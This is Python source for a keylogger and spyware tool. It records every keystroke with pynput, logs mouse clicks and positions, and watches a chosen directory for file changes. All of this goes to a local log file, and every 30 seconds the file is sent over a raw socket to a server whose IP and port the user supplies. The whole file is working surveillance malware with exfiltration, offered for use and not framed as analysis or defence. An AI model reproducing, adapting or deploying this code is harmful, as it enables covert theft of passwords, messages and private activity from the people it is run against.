import os
import time
import logging
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from pynput import keyboard, mouse
import threading
import socket


SERVER_IP = '' #Put Your IP Address
SERVER_PORT = ''#Enter the port
LOG_FILE = "dat.txt"

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def log(message):
    logging.info(message)

# File system event handler for monitoring file changes
class MonitorHandler(FileSystemEventHandler):
    def __init__(self, ignored_files=None):
        self.ignored_files = ignored_files or []

    def process(self, event):
        if not any(file in event.src_path for file in self.ignored_files):
            if event.is_directory:
                return
            event_types = {
                'created': "File Created",
                'modified': "File Modified",
                'deleted': "File Deleted",
                'moved': "File Renamed"
            }
            log(f"{event_types.get(event.event_type, 'Event')}: {event.src_path}")

    def on_created(self, event): self.process(event)
    def on_modified(self, event): self.process(event)
    def on_deleted(self, event): self.process(event)
    def on_moved(self, event): self.process(event)

# Monitors file system changes in a specific directory
def monitor_directory(path="PATH"): #define your path to monitor
    if not os.path.exists(path):
        print(f"Directory {path} does not exist. Exiting monitor.")
        return
    ignored_files = [LOG_FILE, ".vs", "Browse.VC.db"]
    event_handler = MonitorHandler(ignored_files)
    observer = Observer()
    observer.schedule(event_handler, path=path, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()


# Keyboard listener callback for logging keystrokes
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            log(key.char)
        else:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "#BACKSPACE#",
                keyboard.Key.tab: "#TAB#",
                keyboard.Key.shift: "#SHIFT#",
                keyboard.Key.ctrl: "#CTRL#",
                keyboard.Key.alt: "#ALT#",
                keyboard.Key.esc: "#ESCAPE#"
            }
            log(special_keys.get(key, f"#{str(key)}#"))
    except Exception as e:
        log(f"Error logging key: {e}")

# Mouse tracking variables
tracking_interval = 60 
stop_tracking = threading.Event()

def track_mouse_position():
    mouse_controller = mouse.Controller()
    while not stop_tracking.is_set():
        current_x, current_y = mouse_controller.position
        log(f"#MOUSE_MOVE to ({current_x}, {current_y})#")
        time.sleep(tracking_interval)

# Mouse click listener
def on_click(x, y, button, pressed):
    action = "CLICK_DOWN" if pressed else "CLICK_UP"
    log(f"#MOUSE_{action} at ({x}, {y})#")

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_mouse_logger():
    tracking_thread = threading.Thread(target=track_mouse_position)
    tracking_thread.start()
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()
    stop_tracking.set()
    tracking_thread.join()

    
# Send the log file to the server
def send_file_to_server():
    while True:
        if os.path.exists(LOG_FILE):
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                client_socket.connect((SERVER_IP, SERVER_PORT))
                print(f"Connected To Server at {SERVER_IP}:{SERVER_PORT}")

                with open(LOG_FILE, 'rb') as file:
                    while chunk := file.read(4096):
                        client_socket.sendall(chunk)
                print("File sent successfully.")
            except FileNotFoundError:
                print("Error: File not found.")
            except socket.error as e:
                print(f"Socket error: {e}")
            except Exception as e:
                print(f"Error: {e}")
            finally:
                client_socket.close()
        time.sleep(30)  
if __name__ == "__main__":

    monitor_thread = threading.Thread(target=monitor_directory, args=("PATH",)) #define your path to monitor
    monitor_thread.daemon = True
    monitor_thread.start()

    
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()


    mouse_logger_thread = threading.Thread(target=start_mouse_logger)
    mouse_logger_thread.daemon = True
    mouse_logger_thread.start()


    file_sender_thread = threading.Thread(target=send_file_to_server)
    file_sender_thread.daemon = True
    file_sender_thread.start()

 
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_tracking.set()
        monitor_thread.join()
        keylogger_thread.join()
        mouse_logger_thread.join()
        file_sender_thread.join()
